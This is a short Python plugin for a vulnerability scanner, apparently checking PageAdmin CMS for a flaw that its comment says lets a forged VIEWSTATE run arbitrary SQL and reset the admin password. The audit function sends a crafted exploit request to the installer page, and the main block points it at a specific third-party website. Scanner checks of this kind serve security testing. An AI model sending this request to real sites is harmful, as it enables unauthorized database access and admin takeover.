#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:PageAdmin可“伪造”VIEWSTATE从而执行任意SQL查询、可随意重置管理员密码（验证方式不好还请修改）
#Refer:http://www.wooyun.org/bugs/wooyun-2014-061699


def assign(service,arg):
    if service=="pageadmin":
        return True,arg 


def  audit(arg):
    url=arg+"e/install/index.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTExODcwMDU5OTgPZBYCAgEPZBYCAgMPFgIeB1Zpc2libGVoZGQ%3D&ctl02=%E8%BF%90%E8%A1%8CSQL"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "Tb_sql" in res and 'WebForm_DoPostBackWithOptions' in res:
        security_hole(url)
if __name__=="__main__":
    from dummy import *
    audit(assign('pageadmin','http://www.kp-industry.com/')[1])